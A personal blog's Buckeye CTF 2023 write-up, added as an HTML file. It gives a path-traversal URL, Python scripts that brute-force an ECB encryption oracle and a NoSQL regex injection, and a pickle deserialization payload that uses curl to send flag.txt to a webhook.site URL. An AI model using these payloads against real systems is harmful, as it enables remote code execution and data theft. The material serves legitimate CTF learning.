@@ -1,0 +1,85 @@
+<!DOCTYPE html><html domain=cramik.de lang=en><meta charset=utf-8><meta content="width=device-width,initial-scale=1" name=viewport><link href=/favicon.svg rel=icon type=image/svg+xml><meta content=#f9c412 name=theme-color><meta content="max-snippet:-1, max-image-preview: large, max-video-preview: -1" name=robots><title>Buckeye CTF 2023</title><meta content="Buckeye CTF 2023" property=og:title><meta content="I copied this from discord messages I sent" name=description><meta content="I copied this from discord messages I sent" property=og:description><meta content=summary_large_image name=twitter:card><meta content=@ name=twitter:site><meta content=@ name=twitter:creator><meta content=https://cramik.de/img/remote/ZayYlG.jpg property=og:image><link href=https://cramik.de/posts/buckeye-ctf-2023/ rel=canonical><meta content=no-referrer-when-downgrade name=referrer><link href=/feed/feed.xml rel=alternate type=application/atom+xml title=Cramik><link href=/ rel=preconnect crossorigin=""><link href=/fonts/Inter-3.19.var.woff2 rel=preload type=font/woff2 as=font crossorigin=""><script async defer src="/js/min.js?hash=8db32dcb3a"></script><style>@font-face{font-display:optional;font-family:'Noto Sans';src:url(/fonts/notosans.woff2) format('woff2')}body,header{background-color:#111}body{font-family:'Noto Sans',sans-serif;margin:0;padding:0;display:flex;flex-direction:column;align-items:center;min-height:100vh}a,a:hover{color:#f60;text-decoration:none}a:hover,body{color:#fff}header{width:100%;max-width:100%;padding:2em 1.5em;text-align:center}header nav{position:static;width:auto;background:0 0;text-align:center;padding:1em 0;z-index:auto}header nav h1{float:none;display:inline-block;margin-bottom:.5em}header nav a{color:#f60;margin:0 1.5em;display:inline-block}header nav a:first-of-type{margin-left:1.5em}header nav a:last-of-type{margin-right:1.5em}h1,h2,h3,header nav a:hover{color:#fff}main{max-width:90%;border-top:none;width:auto;padding:1.5em;flex-grow:1;color:#ccc}article{width:auto;max-width:100%;padding:0;margin:0 auto 2em}h1,h2,h3{font-family:'Noto Sans',sans-serif;font-style:normal}code,pre{font-family:'Noto Mono',monospace;background-color:#222;color:#ccc;border-radius:4px}pre{padding:1em;overflow-x:auto}:not(pre)>code{padding:.2em .4em;font-size:85%}.token.property{color:#ffeead}.token.char,.token.string{color:#b1f1cb}.token.url{color:#a0f1f0}.token.comment{color:#666}</style><header><nav><div id=nav><h1><a href=/ title=Homepage>Cramik</a></h1></div><div id=reading-progress aria-hidden=true></div></nav><h1>Buckeye CTF 2023</h1><aside>3 min read.</aside><dialog id=message></dialog></header><main><article><h2 id=stray>Stray <a href=#stray class=direct-link>#</a></h2><p>I wrote down this was a javascript type pollution LFI<p><a href="https://stray.chall.pwnoh.io/cat?category%5B%5D=../flag.txt">https://stray.chall.pwnoh.io/cat?category[]=../flag.txt</a><p>bctf{j4v45cr1p7_15_4_6r347_l4n6u463}<h2 id=electronical>Electronical <a href=#electronical class=direct-link>#</a></h2><p>I did this one in three parts since my script was broken but still solved it. Even the official solution for this one said "solve script doesn't entirely work but mostly"<h3 id=script1>Script1 <a href=#script1 class=direct-link>#</a></h3><pre><code>import string
+import requests
+
+zeros=11
+payload="bctf"
+while zeros!=0:
+    goal=requests.get("https://electronical.chall.pwnoh.io/encrypt?message="+'0'*zeros).text[:32]
+    print("Goal = ", goal)
+    for char in string.printable:
+        print('0'*zeros+payload+char)
+        check=requests.get("https://electronical.chall.pwnoh.io/encrypt?message="+'0'*zeros+payload+char).text[:32]
+        print("Check = ", check)
+        if (check==goal):
+            print("Correct")
+            payload+=char
+            zeros-=1
+            break
+</code></pre><h3 id=script2>Script2 <a href=#script2 class=direct-link>#</a></h3><pre><code>import string
+import requests
+
+zeros=16
+payload="bctf{1_c4n7_b3l"
+while zeros!=0:
+    goal=requests.get("https://electronical.chall.pwnoh.io/encrypt?message="+'0'*zeros).text[32:64]
+    print("Goal = ", goal)
+    for char in string.printable:
+        print('0'*zeros+payload+char)
+        check=requests.get("https://electronical.chall.pwnoh.io/encrypt?message="+'0'*zeros+payload+char).text[32:64]
+        print("Check = ", check)
+        if (check==goal):
+            print("Correct")
+            payload+=char
+            break
+    zeros-=1
+</code></pre><h3 id=script3>Script3 <a href=#script3 class=direct-link>#</a></h3><pre><code>import string
+import requests
+
+zeros=16
+payload="bctf{1_c4n7_b3l13v3_u_f0und_my_"
+while zeros!=0:
+    goal=requests.get("https://electronical.chall.pwnoh.io/encrypt?message="+'0'*zeros).text[64:96]
+    print("Goal = ", goal)
+    for char in string.printable:
+        print('0'*zeros+payload+char)
+        check=requests.get("https://electronical.chall.pwnoh.io/encrypt?message="+'0'*zeros+payload+char).text[64:96]
+        print("Check = ", check)
+        if (check==goal):
+            print("Correct")
+            payload+=char
+            break
+    zeros-=1
+</code></pre><h2 id=area51>Area51 <a href=#area51 class=direct-link>#</a></h2><p>Abusing NoSQL injection. See <a href=https://portswigger.net/web-security/nosql-injection>https://portswigger.net/web-security/nosql-injection</a><pre><code>import requests
+import string
+
+success=len(requests.get("https://area51.chall.pwnoh.io/",cookies={"session":"{\"token\":{\"$regex\":\""+password+".*\"}}"}).content)
+keyspace=string.ascii_letters+string.digits+"_"+"{"+"}"
+password="bctf"
+while(password[-1]!='}'):
+     for char in keyspace:
+             print(password+char)
+             if(len(requests.get("https://area51.chall.pwnoh.io/",cookies={"session":"{\"token\":{\"$regex\":\""+password+char+".*\"}}"}).content)==success): 
+                 password+=char
+                 break
+</code></pre><h2 id=text-adventure-api>Text Adventure API <a href=#text-adventure-api class=direct-link>#</a></h2><p>Only slightly different from official solution. Save pickle is loaded on the server allowing RCE via python reduce<pre><code>class test:
+  def __reduce__(self):
+             import subprocess
+             return subprocess.check_output, (["curl","-d","@flag.txt","https://webhook.site/d5092a4a-c837-495e-b231-1511bcdaddae"],)
+pickle.dump(test(),open('C:/Users/Cramik/Desktop/payload5.pkl','wb'))
+</code></pre><script type=application/ld+json>{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "headline": "Buckeye CTF 2023",
+  "image": [],
+  "author": "Cramik", 
+  "genre": "Insert a schema.org genre", 
+  "publisher": {
+    "@type": "Organization",
+    "name": ""
+  },
+  "url": "https://cramik.de/posts/buckeye-ctf-2023/",
+  "mainEntityOfPage": "https://cramik.de/posts/buckeye-ctf-2023/",
+  "datePublished": "2023-10-02",
+  "dateModified": "2025-05-08",
+  "description": "Stray # I wrote down this was a javascript type pollution LFI https://stray.chall.pwnoh.io/cat?category[]=../flag.txt..."
+}</script><p>Published <time datetime=2023-10-02>02 Oct 2023</time></article></main>
